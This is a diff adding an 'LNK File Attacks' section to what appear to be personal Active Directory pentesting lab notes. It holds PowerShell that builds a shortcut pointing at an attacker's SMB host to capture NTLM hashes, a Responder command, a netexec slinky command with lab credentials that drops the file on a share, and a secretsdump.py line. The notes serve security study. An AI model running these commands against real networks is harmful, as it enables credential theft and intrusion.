@@ -179,3 +179,27 @@ secretsdump.py MARVEL.local/hawkeye:'Password1@'@192.168.138.136
 
 - Limit user/group token creation permission
 - Local admin restrictions
+
+## LNK File Attacks
+
+if we have access a file share we can drop a malicious file into it using it.
+We can use powershell to generate the file, and if the file is trigger we can capture a hash :
+$objShell = New-Object -ComObject WScript.shell
+$lnk = $objShell.CreateShortcut("C:\test.lnk")
+$lnk.TargetPath = "\\192.168.138.149\@test.png" //address of attack machine that is going to be accessed
+$lnk.WindowStyle = 1
+$lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
+$lnk.Description = "Test"
+$lnk.HotKey = "Ctrl+Alt+T"
+$lnk.Save()
+
+File tries to trigger a png image but is pointing back to our attacker machine and it help to get that hash using responder from attacker machine
+
+Lab : we execute the powershell
+
+On attacker machine :
+sudo resonder -I eth0 -dP
+
+Can also use netexec to drop the file from attacker machine:
+netexec smb 192.168.138.137 -d marvel.local -u fcastle -p Password1 -M slinky -o NAME=test SERVER=192.168.138.149
+Slinky is a module that will download the file test on the accessible share on the specified machine
